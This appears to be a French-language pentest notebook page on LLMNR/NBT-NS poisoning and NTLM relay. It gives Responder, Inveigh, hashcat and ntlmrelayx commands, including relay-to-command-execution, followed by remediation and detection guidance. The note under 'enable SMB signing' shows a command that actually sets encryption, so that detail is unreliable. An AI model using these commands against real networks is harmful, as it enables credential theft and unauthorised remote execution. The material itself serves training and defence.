
- [ ] [[#1. LLMNR/NBT-NS Poisoning]]
- [ ] [[#2. Relay NetNTLM over SMB]]

[[#Remediation [T1557.001](https //attack.mitre.org/techniques/T1557/001)]]
[[#Detection]]

---
# 1. LLMNR/NBT-NS Poisoning

### Capture du challenge/response

Lancer responder pour capturer le challenge response

```sh
cd /usr/share/responder/ && sudo sed -i 's/On/Off/g' /usr/share/responder/Responder.conf && sudo python3 Responder.py -I eth0
```

Le hash capturé peut être bruteforce avec [[HASHCAT]]

```shell
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

## INVEIGH (Windows)

A lancer dans contexte administrateur

https://github.com/Kevin-Robertson/Inveigh

Powershell (plus maintenue)

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

```powershell
Import-Module .\Inveigh.ps1
```

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

C#

```powershell
.\Inveigh.exe
```

Presser esc pour entrer/sortir du mode interactif

```
HELP
```

Afficher les challenges capturés

```
GET NTLMV2UNIQUE
```

Afficher les usernames

```
GET NTLMV2USERNAMES
```


---


# 2. Relay NetNTLM over SMB

> [!Important]
> Relaie le challenge/response NetNTLM capturé sur un partage SMB
> Exploite NetBIOS, LLMNR et MDNS
> La signature doit être désactivée sur le partage SMB cible

Résolution de nom microsoft

![[Pasted image 20250327220606.png]]
## RESPONDER

### Capture du challenge/response

Lancer responder pour capturer le challenge response

```sh
cd /usr/share/responder/ && sudo sed -i 's/On/Off/g' /usr/share/responder/Responder.conf && sudo python3 Responder.py -I eth0
```

Le hash capturé peut être bruteforce avec [[HASHCAT]]

```shell
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Relai du challenge capturé

Lancer Multirelay en parrallèle vers tous les partages SMB

```bash
cd /usr/share/responder/tools/MultiRelay/ && python3 MultiRelay.py -t <ip_target> -u ALL
```

possible également avec impacket-ntlmrelayx

```shell
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

rce

```shell
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c '<cmd>'
```



---
# Remediation [T1557.001](https://attack.mitre.org/techniques/T1557/001)


- Désactiver Netbios, LLMNR et MDNS
- Activer les signatures smb
- NDR
- Segmentation réseau


## Désactiver LLMNR par GPO

Computer Configuration --> Administrative Templates --> Network --> DNS Client
Activer "Turn off Multicast Name Resolution".


## Désactiver NBT-NS avec Script powershell

Créer script PowerShell suivant

```powershell
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces\tcpip_*' -Name NetbiosOptions -Value 2 -Verbose
```

Le configurer au démarrage sur les machines

- **Configuration ordinateur > Paramètres Windows > Scripts (démarrage/arrêt)**

## Désactiver MD par GPO

**1** - Accédez à : **Configuration ordinateur > Préférences > Paramètres Windows > Registre**

**2** - Effectuez un clic droit, puis sous "**Nouveau**" choisissez "**Élément Registre**".

- **Action** : Mettre à jour (même si cette valeur n'existe pas par défaut)
- **Ruche** : HKEY_LOCAL_MACHINE
- **Chemin d'accès de la clé** : SYSTEM\CurrentControlSet\Services\Dnscache\Parameters
- **Nom de valeur** : EnableMDNS
- **Type de valeur** : REG_DWORD
- **Données de valeur** : 0


## Activer la signature SMB sur les clients

```powershell
Set-SmbClientConfiguration -RequireEncryption $true
```

+ interessant -> https://www.it-connect.fr/sous-windows-11-les-acces-smb-vont-etre-proteges-contre-les-attaques-ntlm/

---
# Detection

https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/

1. Monitorer le trafic sur les ports UDP 5355 et 137 si LLMNR et NBT-NS sont désactivés
2. Monitorer les changements de valeur DWORD sur EnableMulticast dans HKLM\Software\Policies\Microsoft\Windows NT\DNSClient
3. Surveiller les services/daemons nouvellement créés dans les journaux d'événements Windows pour les ID d'événements 4697 et 7045. Déployer un outil de détection du spoofing LLMNR/NBT-NS.
4. Surveiller le trafic réseau provenant de dispositifs matériels inconnus ou inattendus. Les métadonnées du trafic réseau local (telles que l'adressage MAC de la source) ainsi que l'utilisation de protocoles de gestion du réseau tels que DHCP peuvent être utiles pour identifier le matériel.